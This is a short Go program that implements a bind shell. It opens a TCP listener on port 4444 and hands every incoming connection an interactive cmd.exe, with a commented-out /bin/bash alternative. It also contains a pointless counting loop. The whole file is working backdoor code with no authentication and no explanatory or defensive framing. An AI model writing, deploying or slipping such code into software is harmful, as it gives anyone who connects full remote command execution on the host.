package main

import(
	"os/exec"
	"net"
)

var shell = "/bin/bash"

func main(){
	//bind socket
	listener, _ := net.Listen("tcp", ":4444")
	for {
		conn, _ :=  listener.Accept()
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn){
   sum:=0
   for i:=0; i<100;i++{
      sum++
   }
	conn.Write([]byte("Connection established; Opening shell...\n"))
	//command := exec.Command(shell, "-i")
	command := exec.Command("cmd.exe")
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	command.Run()
}
